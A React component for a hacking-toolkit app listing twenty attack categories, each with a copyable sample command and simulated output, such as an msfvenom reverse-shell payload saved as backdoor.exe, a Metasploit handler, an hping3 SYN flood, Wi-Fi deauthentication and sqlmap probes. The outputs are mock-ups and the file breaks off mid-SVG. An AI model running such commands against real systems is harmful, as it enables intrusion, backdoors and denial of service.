import React, { useState } from "react";
import { motion, AnimatePresence } from "motion/react";
import {
  Shield,
  ChevronLeft,
  Terminal,
  Search,
  Wifi,
  Database,
  Mail,
  Globe,
  TerminalSquare,
  FolderSearch,
  Hammer,
  Blocks,
  RefreshCw,
  Zap,
  Monitor,
  Bug,
  Eye,
  Network,
  CloudLightning,
  Smartphone,
  Settings,
  HelpCircle,
  Copy,
  Check,
  Code,
  X,
  Play,
  ArrowRight,
  ExternalLink,
  BookOpen,
  Info
} from "lucide-react";

interface HackingCategory {
  id: string;
  num: number;
  name: string;
  toolsCount: number;
  icon: any;
  desc: string;
  gradient: string;
  accentColor: string;
  terminalCommand: string;
}

export const HackingApp = ({ onBack }: { onBack: () => void }) => {
  const [selectedCat, setSelectedCat] = useState<HackingCategory | null>(null);
  const [copiedText, setCopiedText] = useState<string | null>(null);
  const [customOutputs, setCustomOutputs] = useState<Record<string, string>>({});
  const [editingCode, setEditingCode] = useState<string>("");
  const [isEditing, setIsEditing] = useState(false);

  // Command selection indicator for the interactive command card console
  const [activeTab, setActiveTab] = useState<string>("installation");

  const categories: HackingCategory[] = [
    {
      id: "hiding",
      num: 1,
      name: "Anonymously Hiding Tools",
      toolsCount: 2,
      icon: Shield,
      desc: "Ported ParrotSec's anonsurf and stealth to Kali Linux. Anonymizes the entire system under TOR using iptables, manages I2P, and includes Pandora RAM wiper.",
      gradient: "from-blue-600 to-indigo-700",
      accentColor: "bg-blue-600",
      terminalCommand: "# kali-anonsurf & kali-anonstealth installation & workflow\ngit clone https://github.com/Und3rf10w/kali-anonsurf.git\ncd kali-anonsurf && ./installer.sh\n\n# Usage:\n# anonsurf {start|stop|restart|change|status}\n# pandora {bomb}\n\n# Start system-wide anonymous tunneling under TOR proxy through iptables\nanonsurf start\n\n# Check if AnonSurf is functioning properly\nanonsurf status\n\n# Overwrite system RAM manually and clear cache\npandora bomb"
    },
    {
      id: "gathering",
      num: 2,
      name: "Information Gathering",
      toolsCount: 26,
      icon: Search,
      desc: "Active and passive target reconnaissance. WHOIS queries, nameservers routing, and open port scanning.",
      gradient: "from-cyan-500 to-blue-600",
      accentColor: "bg-cyan-500",
      terminalCommand: "# DNS & Active Ports Probe\nnmap -sV -T4 -p 22,80,443 target-victim.org\n[*] Probe initiated. Gathering application signatures...\n[+] Port 443/TCP Open - Nginx/1.25\n[+] Port 80/TCP Filtered - Cloudflare Edge"
    },
    {
      id: "wordlist",
      num: 3,
      name: "Wordlist Generator",
      toolsCount: 7,
      icon: CpuIcon,
      desc: "Compile bespoke dictionary targets lists based on subject biographical profiles and dynamic patterns.",
      gradient: "from-indigo-500 to-purple-600",
      accentColor: "bg-indigo-500",
      terminalCommand: "# Crunch Dictionary Sequence Compiler\ncrunch 8 12 -t siam_%%%%_@@@ -o target_wordlist.txt\n[+] Building dynamic combos with custom special characters...\n[+] Successful compilation: 5,420 vectors registered."
    },
    {
      id: "wireless",
      num: 4,
      name: "Wireless Attack",
      toolsCount: 13,
      icon: Wifi,
      desc: "Simulate deauthentication, inspect air traffic packets, and decode captured WPA 4-way handshakes.",
      gradient: "from-sky-500 to-indigo-500",
      accentColor: "bg-sky-500",
      terminalCommand: "# Airplay Deauth Handshake Sniffer\naireplay-ng --deauth 15 -a C6:E8:09:12:F3:9B wlan0mon\n[*] Injecting frames to client machines...\n[+] Handshake captured successfully (BSSID matches)."
    },
    {
      id: "sqli",
      num: 5,
      name: "SQL Injection",
      toolsCount: 7,
      icon: Database,
      desc: "Bypass form query login walls, retrieve relational database tables, and verify entry inputs vulnerabilities.",
      gradient: "from-emerald-500 to-teal-600",
      accentColor: "bg-emerald-500",
      terminalCommand: "# SQLMap Database Tables Analyzer\nsqlmap -u \"https://vulnerable.com/id=1\" --dbms=mysql --dbs\n[*] Testing blind timing thresholds query logic...\n[+] Relational backend vulnerable: [user_tables]"
    },
    {
      id: "phishing",
      num: 6,
      name: "Phishing Attack",
      toolsCount: 17,
      icon: Mail,
      desc: "Replicate safety dashboard interfaces, audit SPF headers, and analyze credentials harvester forms.",
      gradient: "from-violet-500 to-pink-500",
      accentColor: "bg-violet-500",
      terminalCommand: "# Phishing Email Compliance Inspector\ncat templates/microsoft_warning.html | grep action\n[!] Form redirect targets suspicious server: http://logger-siam.net\n[+] Standard phishing alert pattern detected."
    },
    {
      id: "web",
      num: 7,
      name: "Web Attack",
      toolsCount: 20,
      icon: Globe,
      desc: "Crawl index trees, expose hidden directory routing backups, and security test web service endpoints.",
      gradient: "from-sky-500 to-blue-600",
      accentColor: "bg-sky-500",
      terminalCommand: "# Directory Web Crawler mapping\ngobuster dir -u https://web-target.net -w paths.txt\n[+] Found: /admin (Status 403) [Size: 312 B]\n[+] Found: /wp-config.php.bak (Status 200) [Size: 1.4 KB]"
    },
    {
      id: "postexploit",
      num: 8,
      name: "Post Exploitation",
      toolsCount: 10,
      icon: TerminalSquare,
      desc: "Maintain persistent backdoors, install reverse shell connections, and escalate execution privileges.",
      gradient: "from-zinc-700 to-slate-900",
      accentColor: "bg-zinc-700",
      terminalCommand: "# Multi-Node Reverse TCP Connection\ncv -lvnp 4444\n[*] Listening on incoming secure port 4444...\n[+] Beacon node received: 10.10.14.88\n$ whoami\nsiam_administrator"
    },
    {
      id: "forensics",
      num: 9,
      name: "Forensics",
      toolsCount: 8,
      icon: FolderSearch,
      desc: "Extract embedded EXIF parameters, inspect media creation indices, and parse hidden signature logs.",
      gradient: "from-amber-500 to-orange-600",
      accentColor: "bg-amber-500",
      terminalCommand: "# ExifTool Forensics Reader\nexiftool device_evidence.png | egrep -i \"gps|camera\"\n[+] Image Device model: iPhone 15 Pro Max\n[+] Exact Geo Coordinates mapped: 23.7522 N, 90.3782 E"
    },
    {
      id: "payload",
      num: 10,
      name: "Payload Creation",
      toolsCount: 8,
      icon: Hammer,
      desc: "Compile custom sandbox shell wrappers, generate direct client vectors, and audit defender bypass metrics.",
      gradient: "from-red-500 to-rose-700",
      accentColor: "bg-red-500",
      terminalCommand: "# MSFVenom Payload Wrapper Compiler\nmsfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.77.1 LPORT=4444 -f exe > backdoor.exe\n[+] Payload successfully saved. Final size: 73 KB"
    },
    {
      id: "exploit",
      num: 11,
      name: "Exploit Framework",
      toolsCount: 4,
      icon: Blocks,
      desc: "Interact with standardized payload handlers, trigger vulnerability logs, and execute targeted CVE actions.",
      gradient: "from-purple-600 to-pink-600",
      accentColor: "bg-purple-600",
      terminalCommand: "# Metasploit Interactive Core CLI\nmsfconsole -q\nmsf6 > use exploit/multi/handler\nmsf6 exploit(handler) > set PAYLOAD windows/x64/shell/reverse_tcp"
    },
    {
      id: "reverse",
      num: 12,
      name: "Reverse Engineering",
      toolsCount: 5,
      icon: RefreshCw,
      desc: "Deconstruct system binaries, review disassembler instructions stream, and parse signature flags.",
      gradient: "from-indigo-600 to-cyan-500",
      accentColor: "bg-indigo-600",
      terminalCommand: "# Radare2 ELF Disassembly Sandbox\nradare2 -A target_compiled_file.o\n[+] Detected architecture: x86_64 ELF format\n[+] Compilation output parsed. Ready for hex layout checks."
    },
    {
      id: "ddos",
      num: 13,
      name: "DDOS Attack",
      toolsCount: 5,
      icon: Zap,
      desc: "Check server bandwidth response thresholds and flood-test internal network firewall boundaries.",
      gradient: "from-red-600 to-amber-500",
      accentColor: "bg-red-600",
      terminalCommand: "# Network packet flood stress testing\nhping3 -S --flood -p 80 192.168.1.100\n[*] Directing packet stream to verify routing bottleneck...\n[+] Service threshold: 14.2 Gbps before loss logs"
    },
    {
      id: "rat",
      num: 14,
      name: "RAT",
      toolsCount: 1,
      icon: Monitor,
      desc: "Securely establish remote administrative control node pathways with active dynamic clients.",
      gradient: "from-blue-700 to-slate-800",
      accentColor: "bg-blue-700",
      terminalCommand: "# Remote administration client terminal\n./rat_broker --port 9090\n[*] Waiting for handshake signals on port 9090...\n[+] Target connection accepted from host: [SIAM_NODE_PRIMARY]"
    },
    {
      id: "xss",
      num: 15,
      name: "XSS Attack",
      toolsCount: 9,
      icon: Bug,
      desc: "Input dynamic browser script objects, security test DOM wrappers, and bypass browser execution defenses.",
      gradient: "from-pink-600 to-rose-500",
      accentColor: "bg-pink-600",
      terminalCommand: "# Cross-Site Scripting Injection Audit\npython3 xss_detector.py --url \"https://vulnerable.com/post\"\n[*] Injecting static browser execution alert payloads...\n[+] DOM model execution bypassed. Vulnerable endpoint verified."
    },
    {
      id: "steganography",
      num: 16,
      name: "Steganography",
      toolsCount: 4,
      icon: Eye,
      desc: "Embed private files or directory indexes inside vanilla media assets, picture, and audio wrappers.",
      gradient: "from-teal-600 to-cyan-600",
      accentColor: "bg-teal-600",
      terminalCommand: "# StegHide Archive extractor\nsteghide extract -sf profile_carrier_image.jpg -p siamPass_steg123\n[*] Verifying media blocks index layers...\n[+] Extraction complete: encrypted_database_recovery.txt"
    },
    {
      id: "activedirectory",
      num: 17,
      name: "Active Directory",
      toolsCount: 6,
      icon: Network,
      desc: "Examine forest relationships pathways, domain controllers, and map group permissions clusters.",
      gradient: "from-indigo-700 to-blue-800",
      accentColor: "bg-indigo-700",
      terminalCommand: "# Active Directory mapping utility\n./sharphound.exe --CollectionMethod All --Domain local-domain.net\n[*] Scraping organizational charts & user privilege directories...\n[+] Chart structures successfully compiled."
    },
    {
      id: "cloud",
      num: 18,
      name: "Cloud Security",
      toolsCount: 4,
      icon: CloudLightning,
      desc: "Audit public files, analyze AWS/Azure high privilege policies, and scan exposed virtual servers.",
      gradient: "from-violet-600 to-purple-700",
      accentColor: "bg-violet-600",
      terminalCommand: "# AWS IAM authentication analyzer\nprowler aws --services iam s3\n[*] Auditing configurations...\n[-] Sentinel Alert: Public read configuration enabled on s3 bucket 'backups'"
    },
    {
      id: "mobile",
      num: 19,
      name: "Mobile Security",
      toolsCount: 3,
      icon: Smartphone,
      desc: "Analyze android package APK codes, manifest requested capabilities list, and local storage variables.",
      gradient: "from-amber-600 to-yellow-500",
      accentColor: "bg-amber-600",
      terminalCommand: "# Mobile APK static analysis decomps\napktool d target_banking_app.apk -o source_output/\n[*] Extracting dynamic java wrappers & standard layout paths...\n[+] Completed. Unlocked local storage source logs."
    },
    {
      id: "other",
      num: 20,
      name: "Other Tools",
      toolsCount: 24,
      icon: Settings,
      desc: "Cryptographic hash creators, validation utilities, encryption dictionaries, and converter support utilities.",
      gradient: "from-orange-500 to-red-500",
      accentColor: "bg-orange-500",
      terminalCommand: "# Crypto Sha256 hashes compilation\necho -n \"Siam_Secure_Hash_2026\" | sha256sum\n[+] Output payload: cf83a073b31ee6845feac9795d64591f06be30bc12b8ffb8f9e"
    }
  ];

  const triggerCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText("Copied");
    setTimeout(() => setCopiedText(null), 2000);
  };

  const getActiveCode = (cat: HackingCategory) => {
    return customOutputs[cat.id] !== undefined ? customOutputs[cat.id] : cat.terminalCommand;
  };

  const handleOpenCat = (cat: HackingCategory) => {
    setSelectedCat(cat);
    setEditingCode(getActiveCode(cat));
    setIsEditing(false);
    setActiveTab("installation");
  };

  const handleSaveCode = () => {
    if (selectedCat) {
      setCustomOutputs(prev => ({
        ...prev,
        [selectedCat.id]: editingCode
      }));
      setIsEditing(false);
    }
  };

  return (
    <div className="w-full h-full flex flex-col bg-[#07070a] text-white overflow-hidden max-w-[100vw] relative select-none">
      
      {/* Sleek matrix/hacker digital noise decor, extremely minimal and clean */}
      <div className="absolute top-0 right-0 w-[400px] h-[400px] bg-red-950/10 rounded-full blur-[120px] pointer-events-none" />
      <div className="absolute bottom-0 left-0 w-[400px] h-[400px] bg-[#10b981]/5 rounded-full blur-[140px] pointer-events-none" />

      {/* Main page view renderer switcher */}
      <AnimatePresence mode="wait">
        {!selectedCat ? (
          /* ========================================================================= */
          /* SCREEN 1: CATEGORIES LIST VIEW (FAHIM ALL TOOLS LOOKALIKE)                */
          /* ========================================================================= */
          <motion.div
            key="list-view"
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="flex-grow overflow-y-auto no-scrollbar bg-[#09090e] pt-[85px] sm:pt-[110px] pb-8 px-3.5 sm:px-6 lg:px-8 relative"
          >
            <div className="max-w-3xl mx-auto flex flex-col gap-6">

              {/* MASTER CATEGORY LIST: Designed EXACTLY like the "Fahim All Tools" reference UI */}
              <div className="rounded-2xl sm:rounded-3xl bg-[#141416] border border-white/[0.05] p-4 sm:p-6 relative overflow-hidden select-none">
                <div className="mb-4 sm:mb-6 flex items-center justify-between gap-4">
                  <div>
                    <span className="text-[10px] sm:text-[11px] font-black uppercase text-[#8e8e93] tracking-widest block mb-0.5">
                      OUR SELECTION
                    </span>
                    <h2 className="text-lg sm:text-2xl font-black text-white tracking-tight font-sans">
                      Siam Hacking Categories
                    </h2>
                  </div>
                  <button
                    onClick={onBack}
                    className="w-[72px] h-[30px] rounded-full bg-[#242426] hover:bg-[#2c2c2f] transition-all duration-150 active:scale-95 flex items-center justify-center text-xs font-black text-[#e1e1e6] hover:text-white cursor-pointer border border-white/5"
                  >
                    Back
                  </button>
                </div>

                {/* List block */}
                <div className="divide-y divide-white/[0.04]">
                  {categories.map((cat) => {
                    const ItemIcon = cat.icon;
                    return (
                      <div
                        key={cat.id}
                        className="py-3.5 sm:py-4.5 flex items-center justify-between gap-3 sm:gap-4 first:pt-0 last:pb-0 font-sans"
                      >
                        <div className="flex items-center gap-3 sm:gap-4 min-w-0">
                          {/* Icon with beautiful color specific gradient, matching screenshot styles */}
                          <div className={`w-10 h-10 sm:w-12 sm:h-12 rounded-xl shrink-0 bg-gradient-to-br ${cat.gradient} p-[1px] flex items-center justify-center shadow-lg shadow-black/20`}>
                            <div className="w-full h-full rounded-[10px] sm:rounded-[11px] bg-black/10 flex items-center justify-center">
                              <ItemIcon className="w-4.5 h-4.5 sm:w-5 sm:h-5 text-white" />
                            </div>
                          </div>

                          {/* Text block */}
                          <div className="min-w-0">
                            <div className="flex items-center gap-1.5 sm:gap-2">
                              <h3 className="text-xs sm:text-[15px] font-bold text-white tracking-tight truncate">
                                {cat.name}
                              </h3>
                              <span className="text-[8px] sm:text-[9px] px-1.5 py-0.5 rounded-md bg-white/5 text-white/50 font-mono font-medium shrink-0">
                                {cat.toolsCount} Tools
                              </span>
                            </div>
                            <p className="text-[11px] sm:text-xs text-[#8e8e93] leading-relaxed mt-0.5 line-clamp-2 max-w-lg">
                              {cat.desc}
                            </p>
                          </div>
                        </div>

                        {/* Action Block styled *exactly* like "Use" pill and "LIVE NOW" status caption underneath */}
                        <div className="flex flex-col items-center shrink-0 min-w-[68px] sm:min-w-[76px]">
                          <button
                            onClick={() => handleOpenCat(cat)}
                            className="w-[64px] sm:w-[72px] h-[28px] sm:h-[30px] rounded-full bg-[#242426] hover:bg-[#2c2c2f] transition-all duration-150 active:scale-95 flex items-center justify-center text-xs font-bold text-[#0a84ff] hover:text-[#3396ff] cursor-pointer border-0"
                          >
                            Use
                          </button>
                          <span className="text-[7.5px] sm:text-[8px] font-black tracking-wider text-[#8e8e93] mt-1 sm:mt-1.5 uppercase font-mono">
                            LIVE NOW
                          </span>
                        </div>

                      </div>
                    );
                  })}
                </div>
              </div>

            </div>
          </motion.div>
        ) : (
          /* ========================================================================= */
          /* SCREEN 2: MAIN DIRECT SUB-PAGE (NO MODAL BOX!)                            */
          /* ========================================================================= */
          <motion.div
            key="detail-view"
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -20 }}
            className="flex-grow overflow-y-auto no-scrollbar bg-[#09090e] pt-[85px] sm:pt-[110px] pb-12 px-3.5 sm:px-6 lg:px-8 relative"
          >
            <div className="max-w-3xl mx-auto flex flex-col gap-6 font-sans">
              
              {/* Back controls navigation bar */}
              <div className="flex items-center justify-between">
                <button
                  onClick={() => setSelectedCat(null)}
                  className="inline-flex items-center gap-1.5 text-xs text-[#8e8e93] hover:text-white transition-colors cursor-pointer"
                >
                  <ChevronLeft className="w-4 h-4" />
                  <span>Back to Categories</span>
                </button>

                <div className="flex items-center gap-2 px-2.5 py-1 rounded-lg bg-[#141416] border border-white/[0.05]">
                  <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                  <span className="text-[9px] text-[#8e8e93] font-mono uppercase tracking-widest pl-1">
                    SUITE TERMINAL ACTIVE
                  </span>
                </div>
              </div>

              {/* Title & info banner */}
              <div className="rounded-2xl border border-white/[0.05] bg-[#141416] p-5.5 sm:p-7 relative overflow-hidden">
                <div className="absolute top-0 right-0 w-32 h-32 bg-white/[0.01] rounded-full blur-2xl pointer-events-none" />
                
                <div className="flex items-start gap-4">
                  <div className={`w-12 h-12 rounded-xl bg-gradient-to-br ${selectedCat.gradient} p-0.5 flex items-center justify-center`}>
                    <div className="w-full h-full rounded-[10px] bg-black/20 flex items-center justify-center">
                      {React.createElement(selectedCat.icon, { className: "w-5 h-5 text-white" })}
                    </div>
                  </div>
                  <div>
                    <div className="inline-flex items-center gap-1.5 px-2 py-0.5 rounded bg-white/5 text-[9px] font-mono text-[#8e8e93] mb-1.5">
                      <Terminal className="w-3 h-3 text-red-500" />
                      <span>MODULE ID: #{selectedCat.num.toString().padStart(2, "0")}</span>
                    </div>
                    <h2 className="text-xl sm:text-2xl font-black text-white tracking-tight leading-none">
                      {selectedCat.name}
                    </h2>
                    <p className="text-xs sm:text-[13px] text-[#8e8e93] mt-2.5 leading-relaxed max-w-xl">
                      {selectedCat.desc}
                    </p>
                  </div>
                </div>
              </div>

              {/* ==================== CONDITIONAL RENDERING FOR "HIDING" (ANONSURF) MODULE ==================== */}
              {selectedCat.id === "hiding" ? (
                <div className="flex flex-col gap-6">
                  {/* GitHub Repo Card */}
                  <div className="p-4 sm:p-5 rounded-2xl border border-white/[0.05] bg-[#141416] flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                    <div className="flex items-center gap-3.5 min-w-0">
                      <div className="w-10 h-10 rounded-xl bg-black flex items-center justify-center text-white/80 border border-white/10 select-none">
                        <Globe className="w-5 h-5 text-indigo-400" />
                      </div>
                      <div className="min-w-0">
                        <span className="text-[10px] font-mono text-indigo-400 uppercase tracking-widest font-bold">PORTED HOST REPOS</span>
                        <h4 className="text-xs sm:text-sm font-bold text-white leading-tight truncate">kali-anonsurf & kali-anonstealth</h4>
                        <p className="text-[11px] text-[#8e8e93] truncate mt-0.5">https://github.com/Und3rf10w/kali-anonsurf.git</p>
                      </div>
                    </div>
                    <a
                      href="https://github.com/Und3rf10w/kali-anonsurf.git"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="inline-flex items-center justify-center gap-1.5 px-4 h-9 rounded-full bg-[#242426] text-xs font-bold text-[#0a84ff] hover:text-[#3396ff] transition-colors cursor-pointer border-0"
                    >
                      <span>Github Repo</span>
                      <ExternalLink className="w-3.5 h-3.5" />
                    </a>
                  </div>

                  {/* Dual Mode Switch Container: Installation & Documentation vs Sandbox */}
                  <div className="rounded-2xl border border-white/[0.05] bg-[#141416] overflow-hidden">
                    <div className="flex border-b border-white/[0.04] bg-[#141416]/50">
                      <button
                        onClick={() => setActiveTab("installation")}
                        className={`flex-1 py-3 text-center text-xs font-bold tracking-tight border-b-2 transition-all cursor-pointer ${
                          activeTab === "installation" ? "border-indigo-500 text-white bg-white/[0.01]" : "border-transparent text-[#8e8e93] hover:text-white"
                        }`}
                      >
                        Documentation & Installation
                      </button>
                      <button
                        onClick={() => setActiveTab("usage")}
                        className={`flex-1 py-3 text-center text-xs font-bold tracking-tight border-b-2 transition-all cursor-pointer ${
                          activeTab === "usage" ? "border-indigo-500 text-white bg-white/[0.01]" : "border-transparent text-[#8e8e93] hover:text-white"
                        }`}
                      >
                        Anonsurf & Pandora Commands
                      </button>
                      <button
                        onClick={() => setActiveTab("sandbox")}
                        className={`flex-1 py-3 text-center text-xs font-bold tracking-tight border-b-2 transition-all cursor-pointer ${
                          activeTab === "sandbox" ? "border-indigo-500 text-white bg-white/[0.01]" : "border-transparent text-[#8e8e93] hover:text-white"
                        }`}
                      >
                        Configuration Sandbox
                      </button>
                    </div>

                    <div className="p-4 sm:p-6 min-h-[280px]">
                      {activeTab === "installation" && (
                        <div className="flex flex-col gap-4">
                          <h3 className="text-sm font-bold text-white flex items-center gap-1.5 uppercase tracking-wide">
                            <BookOpen className="w-4.5 h-4.5 text-indigo-400" />
                            Overview & Deb compilation
                          </h3>
                          <p className="text-xs text-[#8e8e93] leading-relaxed">
                            This repository combines both the <span className="font-semibold text-white">anonsurf</span> and <span className="font-semibold text-white">pandora</span> packages from ParrotSec into one coherent suite. Modifications have been configured to safely query <span className="text-indigo-400 font-semibold font-mono">Private Internet Access DNS servers</span> for higher metadata security.
                          </p>

                          <div className="mt-2 space-y-2.5">
                            <h4 className="text-xs font-bold text-white uppercase tracking-wider font-mono">1. Compiled Package Installation</h4>
                            
                            <div className="rounded-xl bg-black/60 border border-white/[0.03] p-3.5 relative font-mono text-[11px] leading-relaxed select-text text-emerald-400 whitespace-pre-wrap">
                              {`# Step-by-step Kali installer setup\ngit clone https://github.com/Und3rf10w/kali-anonsurf.git\ncd kali-anonsurf\nsudo ./installer.sh`}
                              
                              <button
                                onClick={() => triggerCopy(`git clone https://github.com/Und3rf10w/kali-anonsurf.git\ncd kali-anonsurf\nsudo ./installer.sh`)}
                                className="absolute bottom-2.5 right-2.5 p-1.5 rounded-lg bg-[#1a1a1c] text-[#8e8e93] hover:text-white transition-colors cursor-pointer border border-white/5"
                              >
                                {copiedText === "Copied" ? (
                                  <Check className="w-3.5 h-3.5 text-emerald-400" />
                                ) : (
                                  <Copy className="w-3.5 h-3.5" />
                                )}
                              </button>
                            </div>
                            <p className="text-[11px] text-[#8e8e93] leading-relaxed italic">
                              Once completed, both the `anonsurf` and `pandora` services will be fully compiled and active in the system paths.
                            </p>
                          </div>
                        </div>
                      )}

                      {activeTab === "usage" && (
                        <div className="flex flex-col gap-5">
                          {/* Pandora widget */}
                          <div className="p-3.5 rounded-xl bg-red-500/[0.02] border border-red-500/10 flex flex-col gap-2">
                            <div className="flex items-center justify-between">
                              <span className="text-xs font-bold text-red-400 tracking-wider uppercase font-mono">
                                module: pandora (RAM WIPER)
                              </span>
                              <button
                                onClick={() => triggerCopy("pandora bomb")}
                                className="text-[10px] font-mono text-red-400 underline hover:text-red-300 pointer-events-auto cursor-pointer"
                              >
                                [ Copy Command ]
                              </button>
                            </div>
                            <p className="text-xs text-[#8e8e93] leading-relaxed">
                              Overwrites system processes and clears RAM cache immediately when executing shutdown manually.
                            </p>
                            <div className="rounded bg-black/40 p-2.5 font-mono text-[11px] text-red-400">
                              pandora bomb
                            </div>
                            <span className="text-[10.5px] text-[#8e8e93] italic">
                              Note: This clears system cache registry channels, which terminates any outgoing active SSL / SSH sessions.
                            </span>
                          </div>

                          {/* Anonsurf commands list */}
                          <div className="flex flex-col gap-3">
                            <span className="text-xs font-bold text-indigo-400 tracking-wider uppercase font-mono">
                              module: anonsurf (TOR TUNNELER)
                            </span>
                            <p className="text-xs text-[#8e8e93] leading-relaxed">
                              Anonymizes entire networking processes under premium TOR proxy protocols using custom iptables rulesets.
                            </p>

                            <div className="grid grid-cols-1 md:grid-cols-2 gap-2 mt-1">
                              {[
                                { cmd: "anonsurf start", desc: "Initiate system-wide anonymous TOR tunneling router" },
                                { cmd: "anonsurf stop", desc: "Halt TOR proxy & return securely to clear browser route" },
                                { cmd: "anonsurf restart", desc: "Combines stop and start processes sequentially" },
                                { cmd: "anonsurf change", desc: "Triggers active identity nodes renew internally" },
                                { cmd: "anonsurf status", desc: "Verifies current Tor proxy port tunnels health" },
                                { cmd: "anonsurf starti2p", desc: "Start i2p background nodes integration" },
                                { cmd: "anonsurf stopi2p", desc: "Stop i2p background nodes instantly" }
                              ].map((item, index) => (
                                <div key={index} className="p-2.5 rounded-lg bg-black/30 border border-white/[0.03] flex flex-col justify-between items-start gap-1">
                                  <div className="flex items-center justify-between w-full">
                                    <span className="font-mono text-[11px] font-bold text-white select-text">
                                      {item.cmd}
                                    </span>
                                    <button
                                      onClick={() => triggerCopy(item.cmd)}
                                      className="p-1 text-[#8e8e93] hover:text-white transition-colors cursor-pointer"
                                    >
                                      <Copy className="w-3 h-3" />
                                    </button>
                                  </div>
                                  <span className="text-[10.5px] text-[#8e8e93] leading-relaxed">
                                    {item.desc}
                                  </span>
                                </div>
                              ))}
                            </div>
                          </div>
                        </div>
                      )}

                      {activeTab === "sandbox" && (
                        <div className="flex flex-col gap-4">
                          <div className="flex justify-between items-center text-[10px] font-mono text-[#8e8e93]">
                            <span className="flex items-center gap-1">
                              <Code className="w-3.5 h-3.5 text-indigo-400" /> ACTIVE_CUSTOM_PIPELINE
                            </span>
                            {!isEditing ? (
                              <button
                                onClick={() => {
                                  setEditingCode(getActiveCode(selectedCat));
                                  setIsEditing(true);
                                }}
                                className="text-indigo-400 hover:underline font-bold cursor-pointer"
                              >
                                [ EDIT TERMINAL CONFIG ]
                              </button>
                            ) : (
                              <div className="flex gap-2.5">
                                <button
                                  onClick={handleSaveCode}
                                  className="text-emerald-400 hover:underline font-bold cursor-pointer"
                                >
                                  [ SAVE STATE ]
                                </button>
                                <button
                                  onClick={() => setIsEditing(false)}
                                  className="text-red-400 hover:underline font-bold cursor-pointer"
                                >
                                  [ CANCEL ]
                                </button>
                              </div>
                            )}
                          </div>

                          {isEditing ? (
                            <textarea
                              value={editingCode}
                              onChange={(e) => setEditingCode(e.target.value)}
                              className="w-full h-44 p-3 rounded-xl bg-black border border-white/10 font-mono text-[11px] text-emerald-400 focus:outline-none focus:border-indigo-500 leading-relaxed resize-none"
                              placeholder="Write your custom script parameters here..."
                            />
                          ) : (
                            <div className="rounded-xl bg-black p-4 font-mono text-[11px] leading-relaxed text-emerald-400 whitespace-pre-wrap select-text h-44 overflow-y-auto no-scrollbar border border-white/[0.02]">
                              {getActiveCode(selectedCat)}
                            </div>
                          )}

                          <span className="text-[10px] text-[#8e8e93] flex items-start gap-1.5 leading-relaxed">
                            <Info className="w-3.5 h-3.5 text-indigo-400 shrink-0 mt-0.5" />
                            Use this Sandbox tab to define personal configuration files, DNS nameservers maps, or test scripts details. Click Save above to preserve settings locally.
                          </span>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              ) : (
                /* ==================== GENERAL FALLBACK CATEGORIES TEMPLATE LAYER ==================== */
                <div className="flex flex-col gap-4">
                  <div className="p-4 sm:p-5 rounded-2xl border border-white/[0.05] bg-[#141416] flex flex-col gap-4">
                    <div className="flex items-center justify-between text-[10px] font-mono text-[#8e8e93]">
                      <span className="flex items-center gap-1">
                        <Terminal className="w-4 h-4 text-emerald-400" />
                        ACTIVE EXECUTION ROUTE
                      </span>
                      {!isEditing ? (
                        <button
                          onClick={() => {
                            setEditingCode(getActiveCode(selectedCat));
                            setIsEditing(true);
                          }}
                          className="text-emerald-400 hover:underline font-bold cursor-pointer"
                        >
                          [ EDIT SCRIPT ]
                        </button>
                      ) : (
                        <div className="flex gap-2">
                          <button
                            onClick={handleSaveCode}
                            className="text-emerald-400 hover:underline font-bold cursor-pointer"
                          >
                            [ SAVE ]
                          </button>
                          <button
                            onClick={() => setIsEditing(false)}
                            className="text-red-400 hover:underline font-bold cursor-pointer"
                          >
                            [ CANCEL ]
                          </button>
                        </div>
                      )}
                    </div>

                    {isEditing ? (
                      <textarea
                        value={editingCode}
                        onChange={(e) => setEditingCode(e.target.value)}
                        className="w-full h-56 p-3 rounded-lg bg-black border border-white/10 font-mono text-xs text-emerald-400 focus:outline-none focus:border-emerald-500 leading-relaxed resize-none"
                        placeholder="Write dynamic configurations, script links, or payload arguments here..."
                      />
                    ) : (
                      <div className="rounded-lg bg-black p-4 font-mono text-[11px] leading-relaxed text-emerald-400 whitespace-pre-wrap select-text h-56 overflow-y-auto no-scrollbar border border-white/[0.02]">
                        {getActiveCode(selectedCat)}
                      </div>
                    )}

                    <div className="flex items-center justify-between pt-2 border-t border-white/[0.04]">
                      <span className="text-[10px] text-[#8e8e93] font-mono">
                        Available tools in package memory: <strong className="text-white font-semibold">{selectedCat.toolsCount} units</strong>
                      </span>
                      <button
                        onClick={() => triggerCopy(getActiveCode(selectedCat))}
                        className="h-8 px-4 rounded-full bg-[#242426] hover:bg-[#2c2c2f] text-[10px] font-bold font-mono text-white flex items-center justify-center gap-1.5 cursor-pointer border-0"
                      >
                        {copiedText ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-white/60" />}
                        <span>{copiedText || "Copy Pipeline Payload"}</span>
                      </button>
                    </div>
                  </div>

                  {/* Empty interactive placeholder supporting seamless addition of future tools */}
                  <div className="p-4.5 rounded-xl border border-dashed border-white/10 bg-[#141416]/25 flex items-start gap-3">
                    <Info className="w-4.5 h-4.5 text-[#8e8e93] shrink-0 mt-0.5" />
                    <div>
                      <h4 className="text-xs font-bold text-white">Dynamic category indexing</h4>
                      <p className="text-[11px] text-[#8e8e93] leading-relaxed mt-0.5">
                        You can dynamically configure dynamic payload URLs, tool command strings, and security references for {selectedCat.name} directly inside this workspace envelope.
                      </p>
                    </div>
                  </div>
                </div>
              )}

            </div>
          </motion.div>
        )}
      </AnimatePresence>

    </div>
  );
};

// Simple standalone icon component to bypass missing Lucide CPU import issue
const CpuIcon = (props: any) => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="24"
    height="24"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    {...props}
  >
    <rect x="4" y="4" width="16" height="16" rx="2" />
    <path d="M9 9h6v6H9z" />
    <path d="M9 1v3" />
    <path d="M15 1v3" />
